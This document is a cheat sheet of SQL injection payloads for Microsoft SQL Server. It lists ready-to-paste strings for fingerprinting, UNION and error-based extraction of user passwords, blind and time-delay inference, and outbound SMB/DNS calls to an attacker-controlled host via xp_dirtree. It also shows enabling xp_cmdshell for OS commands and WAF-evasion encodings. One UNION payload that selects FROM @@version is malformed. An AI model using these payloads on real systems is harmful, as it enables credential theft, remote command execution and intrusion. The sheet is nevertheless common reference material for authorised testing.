# Microsoft SQL Server (MSSQL) — SQL Injection Exploitation Cheat Sheet

## 1. Fingerprinting & Environment Recon

```sql
-- Version & architecture
SELECT @@version;

-- Current user / login context
SELECT system_user;
SELECT user_name();

-- Current database
SELECT db_name();

-- Hostname / server details
SELECT @@servername;
SELECT host_name();

-- Privilege assessment (sysadmin check)
SELECT is_srvrolemember('sysadmin');
SELECT is_member('db_owner');
```
## 2. Syntax & Comment Dialects
```SQL
-- Inline comment (no trailing space required)
' AND 1=1--

-- Multi-line comment
' AND /*comment*/ 1=1

-- String concatenation (uses + operator)
SELECT username + ':' + password FROM users;
SELECT CONCAT(username, ':', password) FROM users;
```
**No dummy table required — SELECT 1, 'text' is valid with no FROM clause.

## 3. Schema & Metadata Enumeration
```sql
-- List databases
SELECT name FROM master.dbo.sysdatabases;
SELECT name FROM sys.databases;

-- List tables
SELECT table_name FROM INFORMATION_SCHEMA.TABLES;
SELECT name FROM sysobjects WHERE xtype = 'U';

-- List columns
SELECT column_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'users';

-- Row-folding: aggregate entire table into a single string (SQL Server 2017+)
SELECT STRING_AGG(username + ':' + password, ',') FROM users;

-- Legacy row-folding via FOR XML PATH (pre-2017 fallback)
SELECT STUFF((SELECT ',' + username + ':' + password FROM users FOR XML PATH('')), 1, 1, '');
```
## 4. In-Band Exploitation (UNION & Error-Based)
```sql
-- NULL probing for column count
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--

-- Explicit casting required for string matching in UNION structures
' UNION SELECT NULL, CAST(version AS VARCHAR(8000)), NULL FROM @@version--

-- Verbose error-based extraction via CAST/CONVERT type-conversion failure
' AND CAST((SELECT TOP 1 username FROM users) AS INT)--
' AND CONVERT(INT, (SELECT TOP 1 password FROM users WHERE username='administrator'))--
```
## 5. Blind & Inferential Payloads
```sql
-- Boolean-based extraction
' AND 1=1--
' AND 1=2--
' AND SUBSTRING((SELECT TOP 1 password FROM users WHERE username='administrator'), 1, 1) = 'a'--
' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users WHERE username='administrator'), 1, 1)) > 100--

-- Conditional logic (using CASE WHEN or inline IIF)
' AND (CASE WHEN (1=1) THEN 1 ELSE 0 END) = 1--
' AND IIF(1=1, 1, 0) = 1--

-- Time-based delay (requires stacked queries via semicolon)
'; WAITFOR DELAY '0:0:5';--
'; IF (SUBSTRING((SELECT TOP 1 password FROM users WHERE username='administrator'), 1, 1) = 'a') WAITFOR DELAY '0:0:5';--
```
## 6. Stacked Queries, OAST & OS Execution
```
Stacked query support: NATIVE & WIDESPREAD. MSSQL natively processes semicolon-separated multi-statements across almost all drivers.
```
```sql
-- Out-of-band (OAST) via UNC path resolution (triggers outbound SMB/DNS)
'; EXEC master.dbo.xp_dirtree '\\attacker-controlled-domain\share';--
'; EXEC master.dbo.xp_fileexist '\\attacker-controlled-domain\share\test.txt';--

-- OS Command Execution via xp_cmdshell (requires sysadmin & explicit enablement)
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
'; EXEC xp_cmdshell 'whoami';--
```
## 7. WAF Evasion & DBMS-Specific Quirks
```sql
-- Whitespace alternatives
' UNION%0aSELECT%0a1, 2--
' UNION%09SELECT%091, 2--
' UNION/**/SELECT/**/1, 2--

-- Hex-encoded string literals (bypasses quote-matching filters)
SELECT 0x61646d696e;  -- evaluates to 'admin'
' AND username = 0x61646d696e--
```
